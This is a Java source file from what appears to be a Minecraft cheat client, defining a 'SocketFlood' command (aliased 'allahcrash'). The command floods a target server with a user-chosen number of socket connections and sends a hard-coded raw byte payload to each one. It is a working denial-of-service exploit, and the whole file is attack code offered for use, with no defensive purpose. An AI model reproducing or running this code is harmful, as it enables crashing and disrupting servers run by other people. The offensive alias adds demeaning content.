/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.shadow.client.feature.command.Command;
import net.shadow.client.feature.command.coloring.ArgumentType;
import net.shadow.client.feature.command.coloring.PossibleArgument;
import net.shadow.client.feature.command.coloring.StaticArgumentServer;
import net.shadow.client.feature.command.exception.CommandException;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.helper.util.Utils;

import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class SocketFlood extends Command {

    static final int[] PAYLOAD = new int[] { 0x3, 0x1, 0x0, 0xffffffbb, 0x1, 0x0, 0x0, 0xffffffb7, 0x3, 0x3, 0xffffffcb, 0xffffff82, 0xffffffae, 0x53, 0x15, 0xfffffff6, 0x79, 0x2, 0xffffffc2, 0xb, 0xffffffe1, 0xffffffc2, 0x6a, 0xfffffff8, 0x75, 0xffffffe9, 0x32, 0x23, 0x3c, 0x39, 0x3, 0x3f, 0xffffffa4, 0xffffffc7, 0xffffffb5, 0xffffff88, 0x50, 0x1f, 0x2e, 0x65, 0x21, 0x0, 0x0, 0x48, 0x0, 0x2f };

    public SocketFlood() {
        super("SocketFlood", "Flood the servers console using sockets", "sflood", "socketflood", "allahcrash");
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.STRING, client.player.networkHandler.getConnection().getAddress().toString()), new PossibleArgument(ArgumentType.NUMBER, "25565"), new PossibleArgument(ArgumentType.NUMBER, "(amount)"));
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 2, "Provide address and power");
        List<Socket> sockets = new ArrayList<>();
        new Thread(() -> {
            Notification.create(1000, "SocketFlood", Notification.Type.WARNING, "Charging the cannon...");
            try {
                int c = 0;
                for (int j = 0; j < Integer.valueOf(args[2]); j++) {
                    try {
                        Socket s = new Socket(args[0], Integer.valueOf(args[1]));
                        sockets.add(s);
                    } catch (Exception ignored) {
                        message("server refused new socket");
                        c++;
                    }
                    if (c > 1000) {
                        message("firing early since we got over 1000 closed sockets");
                        break;
                    }
                }
                Notification.create(1000, "SocketFlood", Notification.Type.SUCCESS, "Firing Exploit!");
                for (Socket socket : sockets) {
                    try {
                        DataOutputStream outp = new DataOutputStream(socket.getOutputStream());
                        for (int i1 : PAYLOAD) {
                            outp.write(i1);
                        }
                    } catch (Exception e) {
                    }
                }
                //for(Socket socket : sockets){
                //    socket.close();
                //}
            } catch (Exception e) {
            }
        }).start();
    }
}
